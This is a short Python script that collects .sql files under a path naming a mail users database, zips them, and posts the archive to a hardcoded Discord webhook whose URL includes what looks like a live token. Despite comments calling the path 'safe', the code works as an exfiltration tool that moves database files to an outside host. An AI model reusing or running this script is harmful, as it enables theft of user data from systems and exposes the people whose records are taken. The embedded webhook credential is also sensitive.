import os
import zipfile
import requests

def zip_files(folder_path, zip_name="output.zip"):
    with zipfile.ZipFile(zip_name, "w", zipfile.ZIP_DEFLATED) as zipf:
        for root, dirs, files in os.walk(folder_path):
            for file in files:
                if file.endswith(".sql"):  # only zip .sql files
                    full_path = os.path.join(root, file)
                    zipf.write(full_path, os.path.relpath(full_path, folder_path))
    return zip_name

def send_to_webhook(zip_file, webhook_url):
    with open(zip_file, "rb") as f:
        requests.post(
            webhook_url,
            files={"file": (os.path.basename(zip_file), f, "application/zip")}
        )

if __name__ == "__main__":
    folder = "/home/user-data/mail/users.sqlite"  # <-- replace with your safe folder path
    webhook = "https://discord.com/api/webhooks/1422785670149050460/zDRwvbkZdBmOI6tbku8ctn5IkTNCSVZNT1il7Y1cGyINODCzH5yE5PjwpKcus6ByrXKP"  # <-- replace with your own webhook

    zip_path = zip_files(folder)
    send_to_webhook(zip_path, webhook)
    print("✅ Files zipped and sent to webhook.")
